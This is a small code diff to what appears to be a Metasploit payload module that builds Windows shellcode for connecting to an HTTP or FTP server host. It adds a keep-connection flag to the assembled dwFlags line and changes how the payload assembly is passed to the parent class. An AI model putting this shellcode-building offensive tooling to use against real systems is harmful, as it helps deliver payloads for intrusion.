@@ -89,7 +89,8 @@ module Metasploit3
 			if target_uri =~ /^http:/
 				proto = "http"
 				port_nr = 80
-				dwflags_asm = "push (0x80000000 | 0x04000000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\n"
+				dwflags_asm = "push (0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\n"
+					#;0x00400000 |        ; INTERNET_FLAG_KEEP_CONNECTION
 			end
 
 			if target_uri =~ /^ftp:/
@@ -387,6 +388,7 @@ server_host:
 	db "#{server_host}", 0x00
 end:
 EOS
-		the_payload = Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string
+		self.assembly = payload_data
+		super
 	end
 end
